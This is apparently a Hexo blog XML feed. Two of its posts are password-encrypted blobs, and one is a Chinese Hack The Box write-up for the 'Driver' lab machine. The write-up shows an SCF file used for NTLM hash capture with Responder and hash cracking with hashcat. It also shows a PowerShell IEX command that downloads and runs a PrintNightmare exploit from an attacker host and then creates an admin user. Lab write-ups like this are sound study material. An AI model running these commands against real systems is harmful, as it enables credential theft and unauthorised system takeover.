d8c347b71f02615b251a80b8e155ea3042aedb7e2c92e20816523a99d8190e6119bf569e59e5c618c0e31198a62496aa59d399b6b264fd085a54727575ba3a258cc5e24e652c8e5180cec2d3c4ec24f986f0fc99f6ac07ca975803b1aeb59de117296ee79550096d3c384a865cbb8a296a0ac2504b2ecf2a4556a6de1da109eabd0f673c1fd30789e74df9c950efc03b06f3dcbdd9c6d74bf086bc62697ab7724d547deb77c6a4fe78c3d300868f304c248828be00771da5aa9dfc6f423a3d1d6f54a56ab7480b3a07df6812d08b95f6c620267b36d486d1564c497e06ed69e0d929a677d1508cc928e23368d44f0a0bd14fcd5f0a8244a89e05c1fe00ee9fb5629531917cb0b04409a36eea74e68b750957fd16e40ac2679bbb4ac7369d8c94e5ef09ae466faac58ec8cd53d623909b6215ad6ac0a55ee78137aa086623b745c3a762ece3249200fe43866a5a5d4fa5858e21650ea03ccd31e9116137d9b18fc950d823e6bbb1e1d7561484fec2fda506c4380584bb82d0fc60e30c72a261fe7caefceca2ded7b935725120b93633545510d2928b2124c7e59d47b1d8d5abeb60405d0f2d985ab0f4f085c4d1f1eb2f0de33c8fcc9be24035e9ddcd7a6f18b6fb56f5f8951ae5e08994efb7795ae0d703b13e31a0ea56e4b2fe96a7f8498bed323ac5bdd9c65819cec6fcbcd0503e424631ba706511602785189902d1158aadfb26ecbb74cd72c66811885af0f39c9199337ec89fbaaa49b3f798de9428342d51724a8b262ba903917b2b0574820bd6bb928621603be4e00991693e2a3c8c7af99c76193a153381715d14e70e6a33a04da8955fdbbc9ee7bc7415d9342bf233ea174e334e05a1a16f861a746b6e8cc5bf4d3b88daa32babfbabae0faa70ba81d5af7dd46027d039d7c075c5a5cca7bb1bc5ccb0dd15894654d63ba8a68fe6eafb9fe53ede583175c2d9a6b5ff52eb1ecaad2507c6ec3d7621b878e86ef5ab79d01f9a972c2abb2dc28d320e940d2ffdfab5611a913d02af98d5870daa6448088d9693aa1f2d12b2c71dc359aba596161019d656c56806cfb19b4f4a4e4fe981feac5693094c5cc9fac4452b7849ab752724d50845d2c37ff2cecfd0aea0ce431c80b934ee0c2b0a217dd2d00e6b48ed3ca90c2dffe991af067d8aa93ba451ce07d8c3a2d57d96763c5dcc1b421e3ec542373eba78d6fc9312080f1cbf37954aee9aac6bd627a20464b10a49acf3c34c804d48cf395a45b15e34f7ef05dba811607ff1bc411de6f6545dc718f739afb7e34529c1bba7da48329e9ba503d779260c222d513a404520829acae6d1d4f870c76e3647f5c9365b522636f553ce483be2cee14e953968eddb3c8e17e82e534b23df1733efa487ab5df2e1012dd07c06144f5c938e465f56dbed8b76d06169172cc05f3ab95356046f65626ee076863c9f13ecae7454527f5292f5b50550d5039580f8e4c3edcbe33661ca62c2f95db7dc077fd226a2df48e7398b04d5f47344ec036441e950f358373267d98d4df59adeaa669dc94a01bea773b1267b889cd9926794d5864388d41e77829b724e4348f72feffe5dfd3e4386719a8e19f7200464438e3ecc3258b2a9724748baffd07727d57d22d200c93f8a92f322536ef54c67246866bf7e19e0fde7b7f85b02753ad124d5badb81e35d7917bb7213b02c916005a2f134d6dfc27b803b011286b61d09f8ba2737605c287b348f8aadfd32f00faaf58604895ce96107a57683db3ce5aae93356b535cd87614d8747ab010d6b69d6fe33631d45fa54dfa63ce8b5c94fff76c9a49a253a8c3c3d567810aed0b319e2b0ef38ffad5320c8079c0f40f888acc027409cc0287274dc2e366be4deb6d7926897af5d349091c628f89f3608d28a8d7b6736ff9bf96af6ef44c1a0d03f10137b5fd637b8f21a7c36310a5d4b2c4127e3b5cb810f99f31eece0e27a5998eb6bcba1c30df2b90851aa3051ef9df49af5d2bb42136badcf8df9ab54ad4525734852db17b072b0e1571f988d3377f6953615b87584ca2b18feb8543e2a3973c7078bdeb0e4c0f866836f302f8be69b2798cbd1821b096cff18c1d91aefc8fb1ab4f979de3eb90262de736b2009ccef325dcb6a7661f946b7f9983cd01492905ebddb4e00298ce8476604922b49a3ffb908026b11a4ffb78756c4e298f76ccef692b8816124acb2761fac399fb6374e2e4ea0995566c19c7cf013395e4fd5681a9da8ab53db87ee66ead93a06594f5c891851f73998f50513e68790397a1f74bd8bb75f9e0b21bbd2a26d3827d24a4331c3443af584c72e31b0bd7e1a4972cf9fd5c8b4383e79ead674500598110ed8743cf25e77cc8cd7c51507a8d23c924a8efcb04b7fd34ea7e01cb54636835bf574a7dbf551d8eb44763b572913090956ba60adf5de0d8b4d7279db9a5a79340e85f3e00c720735b8983e2b1dcbcae5f210aa021903c99432f7f1bb8b99a843503daa6b3f03212dc7494069fb843f71defaadad6694c41008cfabefc2dbdd271f81ee43f84e942d4af261ebf18364d16cd92d66c8c8f5ca237af4e81e93db17c254fb2dbe7de7d72dc679d583f93b310b428b9d5a3e568dbda98ecf148a3ab9af7bc84120d8250e4010df425be405e44dcc0fb1bdbea2095330f6a10614738239eb4c3efc45d2287e44b28b21105d63648a25eed9e4a77cb80b299917095650a725e2d760b09f1af5c4de9060124bdf9b04bcfba2a95c4c012e9ef7bacd7363ce5caf5313b39541bb39510d7ee26e4cdd3503ed1739b06791df9f4e1d8b5347b8a7bcd6dbebf9d4d7c0414e2cdb7c84eca81f0f60f448b4cc95307dc15e3964f5db0598c8aea0effe84b33d3d0a16e14211f5d226fde9727c189aa80bf7e2dc2b61af4dbd185ba3523aa639d2b7c17b48af68873992f5ed4c499671f81a1a20e48e30d1b6f9c87de43a02be79da852524a58d57f07765f860ef1bc58d035996afee0e20151057f1145afed8184c70a3b3a5f04f551a4e2584e3b0591a50f49e38a6c91bcd60abccdd2ac128386cbbd551ddbd82ea4c7ce6fd734ec1daa6fdb8baeee212024d0cb3ab07f0b4e7252bbecf470fa5b5aa5c5170f61fad4d4608a6a8bd3f34377a78d7e7255d62cee3b19da7531a9a49eb239d9740deedab9d64c9282ef2d716b7f33fe4306c2f459efbbf27156036aaf806436626d1aae48fb7ce825f5f053b6a0aca71470c59300d360c7942688269fbf554b15281478ac12239cb90dd18b9da14c9f3082aadb67eaf839d65f08aa5b6a0c8edf60850c43f55fb807914671cd548e7f34a0d0f8e702f71306b7fde78573f1b0a28fcb51dadd5b95d0d22ead5ea97596a51310c93aea2cefb8febce264f4b34cad014d6fd3968bfb8f0c418c27a80a25ac9a35fcba8e0fca4cbaeed971957b063a9fc225f8769649d2d20ddde385d88fefbf742309f6cc22c213309272a6ace9aee5e21bfa4de5a7dbdfdc0f03c51f46cc607386b790f12c3f921c0c68ade2981b914b5674d93848f5a4c263c5bcc0d39b7143b3ce92147e20457b76757bff1926d76155298e75b86d6cbae055094eec38c624e09b7b5ad16a91aa10b14236fb5ec90d5473a5623ec179221f5af326d9c979081b7291544be8160db6654de8da2ace1cbdea2df5417ef594020e89d5d6a961dd0e641fc2fd613f4d17ba683d02c142bd908cce6c340eafecee76df42db1e62521be52b86c8a83d5953440753b3fbd8a7b47f0c20812c130a177665a9523b9f551ed6bf6967f52122ce991f7fae3ce18ed17d007e0ea2ac8ac0b615a09710293050de1b0d393e1857cca5b2b7449e8dd584438310dc3e8c4233c04a476686d439f0ed84bdaa70aaefc0c16cb13ca0868dbdaa65f9aed3dff0ed3624fc8ec900f7fb902094cc447fa1ae0753be4785087cebfd1bebac3c0bf85b30bcbbaaa9676e4cad8f0db0e82c2be0f5185498ed0d2640d935513ed0b00899392bff5c49ff7cab91f5a1fd0d315fd087a57ab5bb5429390e61ff097731b8990253c591afc0fac3922b675c465fd0cfd4923bab58bdafd510ef3578fb27aa32b18e63c48888e6cc50e849a6975f0e0c2e34b2b4a695858a76c6f268bfda6ddaebe305608320e6430f80640f03b9803b62b84abae2e2ecc256ee378a2c0d4d4d17890b3e32dc4d4d426dd17f678b9cd4f901410169d0d65469e5761e7aa2edebabde6a3d6e95a2e190ae0bc543c00f7637da652b6dfce9cc5c39f1f3e80b4c2ae7b186005eb0e6d5f22dbb9797cecd7237b982a8641d0f17b3eddc7b7e63758a537ce7fe40bb8ae925290e425b22a4f56e97f69368450e9d38d7a4a8e7e99ea6b28c123dcf24fa4286984eb59bee7f8bdc54b710876f18ccf8b312fcd08f92b8f166e59af8a124a8499633f1ba4d5ff9c223fe0dbad6a64585179dc766c795f0a6a4c4568c5f038345320c8fe513d35e0c8dc57819533018b24ddce3fb9060dc7d3fa85bcb3ee505c7c3426cf78003d24e7d0b21d7edc8e8f6a30763f6f5e3bca31d3b937a44474fb48ee3f69fccbf0043a934551ec51c29ae0a58c428f82aa88897e478263cfabe1556fa99a2891f8bb9eb486254544ea1a300549993d747f0a52322b4c00b05f9c508d0546a287ab740025a8bf20fc3404bad0cf8877f84a34f4800a64cbbaa9276ceea85ae77ca62639cf3d6ce63941867a9808078db8edd28a7e9335254c06e95a822013fae7cbfccb792ec8bdef422e42502face97fdd780f89fd3d89413a6c4e789d19b1d594c294907bd3652c04dc8ab8a201cdd9d15543b7dc71d3d5e77e322c9e28056aa725ad56e1c458f962cc8d0d91fa8db636ea5970cc88356d449d3b406f8136305cf8f42973928d49bb0225a388427be7bb7091959a5dafa56ac6d62ec14ae3e2047e40d063d03cc84c8c6aa0d0188333b06a84b76e591bacef4</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-editorial复盘</title>
    <url>/2024/06/19/htb-editorial%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="1f921fbbff15c551a8e36907d0392b10be414ddb13375860e513c883c33aeb64">30d1cda685abf5401ce8be36443054c12d93976f3423e4fc2eaa996141e194c228ca43a8b7d26a1f93493ca3bcd37995a12b9b08d166b59923d687351280fae2b9f7a44bdc0f0f68965f100b64ec3f627364825ad97be1928b3365ba8136189009815fa798620c07e34b5e5f0570847edca367d8dce05442c88b37d61feb28a1c223668efdfe46f80f75b08af0db0af25625315516a4f2e8f970ec8fd430e7df1ed4e9914c8bb51f3f17bc5a8e6676b3b8d257ae946b3723aa9b26dd34276e5a0da1a3da5568d6c4e2cedd92132d2c79466b85c8f58ed06ad5e46f793e239e7375f24cd2df2cec775dbde5dd2269c05913bb6b82676b7afe0f6ec8e11324274845b2fbfc4a205835d03e8b5530e0a51bdfe03fb10352b449bdbe7292978e7ff1196aedc29226d2d69d702d9863b1002a00b4bce756da0cd90f3187f109206be9efd4212f2912eeb9faf30e1242bd0a6891de8d4a022089217fd60337cbd02493d2a31b9fdab3b04d3e52075d649801efcf14fc9e0181ff33a613a50d0de0963d9569c757d787cd2281750ccafe2d30187578b5263ad4ed1f2e100c1dae7c4759850262e10330148ab56fb8b692aa4d27ef67335e37c7b25802d5088f1a6fab9ba1010bd744cb209997c32c99531deeef2299722fef724919a6b0c12c985b80ed8cdebfae942b5d3a8dda2463799d38184b1679893314cd37286b2e2fbe48bc90553728377398ae98fd58816b53291b8aba5dd10618d30a6d0c14bfcb0867bdeb3f1670ed5a1d39bd975ae70764792821eb7234e91487beda0128a6dcc94a9a7be9a6263614ebfebec47757b94df8b70125719af900edcc4603e999399e5dd1dc0b30a5710c31d8dd44b90ca9bb77564e574a70a2f8c610b9d800208f8c2e6e85e39655b87333588149484825fb3543f5cadcce60993bcb33f116b207d29947a1266869f83c5122d8806325674577d09f743cac2043df2a888703cad4c0d4d115904d31e6b7c73c1248be2e9581363d794175d57d958fedc8c10b3a2896be5527830790bd133a2c02e17ca599d6cfd07879c8622d8e82c194bd9de1c33bf9b4a8bcbd313b649c65c5a19d1bdfab7dc7ef330bc68e6a140ff3e8a2a50334693736a0c9944b40c4be4ab35b6ea62a079b246e7995836febd0ec3980609fe47114549d815b6487363639cf1eaca255f37d7805e66d5480f280242a4fe2a5f77ff62fb7ac2f0c32b8ac81c0d8ab907834c71c6db1d5063eb5a8496386d9ed300f8f01c25c1b4efa9b2b064a9b097358b97cc8876f30fbec2067ea7f076eced0a14a20515d14484bb1f599f11f4c063a94acc1514ec1bdd9fddc10cf2efd665ba7cf342225c14d33903401499ac35097c8fd7e9af3d2059e32b877e644e6300815292e974d135ecd9630b3f19aaaa267488d5158c510a3a9a4fc21719698b2c1d4524d8a55f1acf87aa39fc01d5f344aeef640a4f98930d2e855736c7b945be61e3121ceaafe4b7996c0b0ada67a5100c4090aa5aef99837b634da6931ee62711a2a6eb9696b35e5cef37b1f20685f97a65d0d5d62a72d1066f930065aa794722973976bf3804619bedc0533fbde0f5bd7781a55aab3841431481337153fc5ef3bb2802c615b4ef8baeece20670dcc93c6ab3885efbd87be7fb7cda70d165247d8744de3e3d7c97955ad83e4b6bccc2619dce56b3ef8ba89b5cfcd01642d5995982478432fd83608ff62df2a2bd9193feb462447375adb1d0bab66079f5273c81d9e5aea1314a7217b71d7baf48c4b2a235e4f443f88c6bdc8f62dd8f4b30f4987b931b765cc810c49047d1a298d50477ded1e4ed1804f216ca3a19e82e2c2489a7319978a2459cfb59e79bf8703280d35dd7ee5b82f88bf07bef566081990f5ee24200f20e59c42649201ade30d76cf64a4bb07b61616267977af51a509bcd9610290f85ba87d91d7d97aa0cc692e435e054746c05eb61fd7d250dcebee0f16dc69b0f8a90db500d60900c3615350fdf05533ce471e6fe9a4c4b98f9823b0815f1b1d65bd34f84e114a288ab346a39d08821ea5b07578777a63afabea9f82a59fc9e051454ea64d5bbb6f4584cfbb202372a41009d9b1794aac745fc27914e5da4d5e0000aa66eddd8d31b47e58c5a17771b5ba8aa68df261af92912202e5ecebe2eb443260a553fcedb3003e4431d4db4095208c93b5539fffbc17f86927387870402fe282d45c8776f24ed67bbe9512d45f65dbabcd601fa62b68d2ed1212a3e1d5dad8723846840f7e7b6c24bb422600acd26d82f76b688ea155015ef7a5cdbeee387b7a8cee3f3f7d4ae4a9a5e421a2db6cc2f06bc6c26e8ddebd4c8ad27ab6cc486efbc94cf46896845c8db97a28c1b091571f1f44157e09476afa7b29e19a80193d10b9402da6f48473e9b79176ff5f2eaaeb9b639457db2885c71ce790b3f4b72fec20ed8c7182d92c24f55c2ae159d39acca0011eb67759d30e773df5874cf15bb94541e2a6975b5c622f397ff48e773aee739f0cdb02f64342152b0f4a6418cf42a25d89159032fc175a090f646682651ba8e0d6e48f748d16c6f685a4cc2f36671d0d4c87987821f5f198075eb5d75309dc0d64e9ae0b9977b1be626e4efb3f1c76469495f681b450fd78f3124919bdff066f2877caf9ebf2703c62de9537c07bc2ac77cf2a238ec50411acd40364ee6e7f8d0120de5661114b95163627b8f226beadb3738cc29ea078c3047f4293d28f4c7c44841915b5de99311cde785c221e6e41ed9a29588eeb6a6c44200554a14a74d7df9437edd70f9c501274448781e15dc6946942937b4135a2229dc1edb284e5225cd4212b044ceffdc09940cd4df71ae525993e47b1ea25c1490e484d1597d6fdd92bf04745a05fa01decd79cd739576627ad54d251b2f3b467c391aca7d8550455caf00f604b90b6d232841a873c18eaf25e4b6735f0b440d1e22b28c2eaa0b9481346a60c921c96413012254d9d26823f9a52fd020e8024dc16d01ba46772ab65c813a193a8b2bae580ae8e933c776656b9ed56bb251b41c671ae3b1f895807d1b7ca0354fb5b985893ff5f0fa8fa87b630e51d1b3379c5618854d5e17abb4a6bfb2c066b2857aaeb03ac068c2e5d465dec7ffca6c99934839e41fd23ea243bcab34e25421948aea7497e97ea706b4da94188634b8a58edb3fcfc12dbddf27513ed77b86beb9fef9f86838f5634e17b926bf92d3f57b6fbd8ce6d581c1891cea5c68595ff5f529747baee59103767463497ee6996d854193357195371fd5c42264925919373cf78f1d93f5a94f88c5bd6cafbc870a2534a8b627539f1a9a2602cb0ea83450d9ec3a9ea7a3b762237f57d464d17666ac7821b685620663cbd38292ddf34e93b366091c819c4adc8b305ada6f7003899e813affe3ffaf9ba08b228d4bd53a9ee70fa294d321e27ee4e4ad05d9665d4af935fd55746718755f41be6f309950ebd4eb9258609655b6cf50eac37a26d82466d95c1f77c43cd1463683dfa0329fac30f76edb5d91db80f3d3767556a0441e31a08a6f069abbba522eb886244d39f2107ac4304acfeaa0d6fbfcaf76500134ab71c9f5114b7661f39bea7e842641a4f222402c7358a213135f49d8d2238ea232837fcabb27e19206a82f8aa6c093b39fd65438d448f785e49c4ab53d769e8a01d5db42115b77a4c69516d5b48100d982f4aed4545530c9efb79d501c248385e6c461f9dc0d3a1b2b87c91f90f9bef8be386ccf681e7403f6b09d2bf2383486e4cf336aae791dee54c71db5b4ad509c3e41383323397277a6abe7c7bab9b9e2c6ee410737a6992abaa31f85a07855af4e156d05455ee7e73148aee046b631f45b8435960a463601121f8b4999295ed643e3610122b7de62cbd3e5b3621f3cf56fef37c552e586b262d0188d191bb634e985f3394ec5b345b4eea3c1e7355a290024dafc8151982e969204e8265f8a463b7d837cbe085ceaea42ffd37f22d4f3c413db42cd79643d1faad8cdce2bca5d5e04fbeb133cb72d658452ded410c566937cea38b6d8397ba6be710f9f283419e0276be07756b326103690b6d11e913ee5979cd65cda169f35d55f40cd62819db0de39fbf09b9a3baf7d75e77a753ecfdc14636e3c2f606303efcf6d80d41768fa450e0090dcca7295cac63c57293839b7b3997fb828cc75d9ecc8049a450c38f2af860765863ebcef36daff903af3a7a1e33184989f238e6a75444b276683cd5b5372c2c8930127aabbece31f349a174616bb653a8ab438263c0cdd26d1260feb3778c0b13bc61a31e5edd9f4b1c5e4bbfd21d7c832df6f0606c8bfa8a2e8d9f3275b7bb3ad66862406298b1599361dd480ccf4b6133395b5046e3643eac2d448eb0608deaf0e2d3cddb462e3240847cf13a1e71f81d99efb3429c9b0e1bbb630d47b3e05b9631fae712f6640bd89594020421ad2d6aa3cf2e2f3380605f8180e950310ef019e95e6c403ba94c03de62fb21c135f3c37d17baeb804890944027dd78e60753bbf0a5702d790455dc81d9ec78bbc7f6f5af64d6e236a18495ca21797da3bef14ac3b26f380c8f35102eb42897fb7b6c71fb01c65e1c85982a71938848689773f42dad6ceceef5dbe85a6eb043378f3735bf7c68bf5874464b5ec3c46356f98c124bd2d49672cc05eb2fc8a1a5c7a7e30dfd5b3dd73e820633735bc49baee77e445eb38b22446a02a1178f238cd1561c1b206748c0db33d6a4cbb70324e1d5e26e16f3539684c0207f824e048db4252152c97ba71c61be565f24935511243bdf7104f9b3f35ff36226a82c649a5e255dfd4f2979034c06624658734de4e61f3413156823d321710e2076c7931d7d65f25475078ad1dbdcbf658f2f84210520ddb9b083d18a1c8fef3c8a1903d8cf30e26ecdbeb5884125b16efda25bb7210b7b34ecaec3bb2640efb9c52eb4cd63dea558f44f6a956038b9f393288272d67070e38a879cf8765fa9dbe992a88d38abfbd4ecc521051d2190c1b0bce3e40ce16a960ee162bb655ff5f3164c448ad59ac70ec6f207c09bb5cedd73fad65f23c8ca8c71ae4d6bc48c98a8b6903862299929336681e90a1a12c0dac9661a3dbd0ed4020c407efed17cb1bdc5a43a541ab08a2d500aeb9f587c1165d1c53d4fdc8c76e2fe5cb9eb72e03727e75ff5c7d55101279849be93a14c89821c996c78ef661afa9e21acec30d1ff312e4a32fe8274e5360bb4b5258c65706d2dcedcc816b6ea0ab4a52fba9798db33ddc98d646fcd2c275db029e2047a89eedcdb9a93febbbd48830582321a08459c6b1a8dcbe9c844832b2365a213ac60ea72454b7667682e259a0f91edf64af477ffb4c200e6d4fe2d6037b714b2ea0e5f7d98a128b3517cbd78f4962dea4248926ed5915b9b2662cc734ea48a8b28dc215ad21a509b0265cf0e63ee7892e5eec887c8c782812c18cedeb534061739221a0afb7f518d38650ba8855d1fd378d8a0ab1e5ee94ad597524e5a91e1e0d2f2494c539ee8a4ee08abc16571610376002b2bb9919854b54349347e58644ca966b6174809c703c16aa22fdcbd824ebd7d9bef071da68fef34d803216949415f0507bd3e9212ba9e77410af0e22cde110832889689f1dcc7e9ba290b9eaba719e457440f9ba1290e5f876b96520a2a9047a1f98b83bf204038c65574e60b16b384bdfe4c15655ca82cc228621f3cfd6bb8f1b676eafc3818ceb8c2e71d1dd256fcac044606ac7b26a5c91bd7b948ef0ed19b68d517b9bae21c03da437a9d01920eac393f19d32dcc3175a3b707f800b8ae176660e073624260ff8f413c9513c5d354eb5969495e82fc135a61796cbe5cac97f3e38e0d985a20de5e05b3292e5ebf105dbbec24bd9586b1c505544e8552623d540862b07083a54a16e254bb9ae5d566e224fe6431ef11c4160374e04aa5275e5f59ec51d57fd5fc5dfdc6af512a48575eec4f08db09a976b9daa2e75f6c8184aa41ce5ea0853cd9bd02da93ac89ad167ed6c53a186313bf48fc374b70dbb55c5f5b46caa343ee6561b826b8803abcbb0ddb55693b1b4db30bcaf36ac6d23ab150b9721c607d6399a4f461fcb4e9f774e7b2460ebcb05c77c4b9bd3c986f06180b141485bb4f969c1fe6af5f4e759e3bd19cd23ec697bd3ad9fb9c69ef028a50e77053df3316ae48eb771eb4736e7e66e5e6b8afd24aa20c7633d75433a40f3d9d3c3222c14b218a8202fc2b951e29201f2a175075388225d7e968dad1c7a273daf5a509bf7c3ace25b856321a3cd0afec8cb635385158bb24cb6f69b815540b930b2d843350088d1c85017e4ff47495bff9a01105b248872bffd18f294ddc0a03cbba68ab3c277d02431824254e2b991f94dbaa88c91c9c7fe4abeb6f5dcfb32c144bb98827e6e41742fd72372089550680813dd05fa65f1d4d8583667c5fd9ae98bf11fdcad8e5ad3232ded82de1ed5f2796f8d2632aad0bbe6275f78f124351f6f17238521c76591cb7df5f456b0e4376c816ffb9763d2f9f27277de5834ab1f8dd9dffc78f60bb0c21218cd254e621f847f37349271201a5c7fedad0a633271b33050f50b613f33a2efc66531f2356d9368b7f2537e8a53a969a7c2de856ce66f54968836e1f6f45bab316064663c54996f802bb8cb48d8d1ceed44d3b991e40afc0241c35da01ededc319cc14bd6c2cabc3afe514b382a13267103cb12da6b89d2368653e188e3568a4d85fcf86e5df654904508e2d01225cdce64b372cc8ee03e116f5d2185236a0d4be24313ad6162942332b98432d5a9c95665950b2c9a01bb357df2bc665c6f84cf6163a7c73bbd35510155ebc380af5086853c2da99997c1ce3be0229e4b005db1369f31b1c80bc2ad38634f506dfd2029e9ad2e24b1d6fc72613896b2e59d5a04919fb0d17340f78929b8d0c6679ca294339a9d21db19d2ad7005f8d72c317f2b040191aeecacb97cb1ece5dda0512a0e2aa3b6eed3fca02acff11b02f58cfc15eed24f1ea1a03d1b3f588d6a257ebbad2e0e742158ebe845b298e16c038ccde80ecb30667e432b80a4e054a596aba6b480b9d941f42c5949f0d5c318477b52674b19ef5203c47465d0964e73a5f761722869a681a418d07d3e055d0881d7a3100a1483c99433687185f8fa5de58c0795e6883ee14aa6ddfa0826f501583a47fc63c5d1535403cb1e218782f358b05940841c18e830715e7e233c59d38256231c2de7c88f52e00aa1ed583cdcfcd2c9971ded50e2d066c81ee3bf9d064b2d6e6c3e0fdb1bc7579143aba65c655dd4844a1b3d17e877263019b51f6dc6ee457281b665163d6d57b171ba9e5d9628be06f945aac8dbe6778d5bf5fcf3cb3d7e3c0f6d4205d3abba73d6b4496c3b69e9540cfb8bdacfac0811dfa37765d9cfeca0be12d348515d03c08b416d1fd4d96f517a465b22e5fe686868f3622209c68bcf7eced08a5b17725bcf28c04923a8344a873a79fca58696563031786dc93ec4f2a7d718fcb8d062f1007555de5e909ca9b195023380904774b35600004442688fe6d6484f3b9d6adfaea5c8a4e811e03ff37cf0e0487b40d07b04fabdb450af3c70b24d90b79b8ecd03acff9f023b366d4e3883b216f2411ee031372</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>htb driver复盘</title>
    <url>/2024/04/10/htb-driver%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>📝📝📝</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
<p>👍：<a class="link"   href="https://npfs06.top/2021/11/28/Hacktehbox-Driver/" >https://npfs06.top/2021/11/28/Hacktehbox-Driver/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://m.freebuf.com/articles/web/318970.html" >https://m.freebuf.com/articles/web/318970.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Driver" >https://app.hackthebox.com/machines/Driver<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>ip：10.10.11.106</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.11.106</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085005.png" ></p>
<p>开的端口不少，有445端口（SMB），5985证明可以用evil-winrm登陆</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085356.png"   style="zoom:30%;" >

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085439.png" ></p>
<p>枚举和smbclient都找不到有效信息，而且这个windows版本是10，用不了永恒之蓝（知识点摄入了！）</p>
<p>看到80端口开放，有个登陆口，猜测是弱口令’admin:admin’，成功了，进入发现是个打印系统</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410084730.png"   style="zoom:50%;" >

<p>扫目录扫不到什么东西，但是很容易找到一个文件上传点，结合前面开的SMB，尝试<strong>通过NTLM捕获进行SMB攻击</strong></p>
<p><a class="link"   href="https://m.freebuf.com/articles/web/318970.html" >何为通过NTLM捕获进行SMB攻击<i class="fas fa-external-link-alt"></i></a> 这篇文章写的很清楚👍，接下来跟着利用就行</p>
<p>1.先写一个scf文件（<em>SCF文件</em>是“WINDOWS资源管理器命令”文件，它也是一种可执行文件）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.16.3\tools\nc.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure>

<p>2.上传恶意文件让网络中的用户（受害者）试图访问我们的共享文件，这时Responder说：请提供给我NTLMv2哈希并访问资源，Responder就收到受害的hash了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">responder -w -I tun0</span><br></pre></td></tr></table></figure>

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410091850.png"   style="zoom:50%;" >

<p>然后上传scf文件，然后就抓到一串hash</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092123.png" ></p>
<p>hashcat爆破，爆出密码为liltony</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash --wordlist /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092222.png" ></p>
<p>拿着账号密码登陆tony账户，成功拿到第一个flag</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092334.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get-process # 查看进程</span><br></pre></td></tr></table></figure>

<p>找到一个spoolsv，网上能找到公开漏洞</p>
<p><a class="link"   href="https://github.com/calebstewart/CVE-2021-1675" >https://github.com/calebstewart/CVE-2021-1675<i class="fas fa-external-link-alt"></i></a></p>
<p>下载poc放到网站目录下，让靶机下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://10.10.16.3/CVE-2021-1675.ps1&quot;)</span><br></pre></td></tr></table></figure>

<p>添加一个新的用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-Nightmare -DriverName &quot;DRIVER&quot; -NewUser &quot;abc&quot; -NewPassword &quot;abc123&quot;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-10%2009.29.46.png" ></p>
<p>查看管理员组，确认权限没问题</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410093053.png" ></p>
<p>再用evil-winRM登陆，这个时候就是管理员权限了，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410093255.png" ></p>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>在历史命令文件中找到RICOH PCL6 UniversalDriver V4.23服务，msf有相关poc可以用</p>
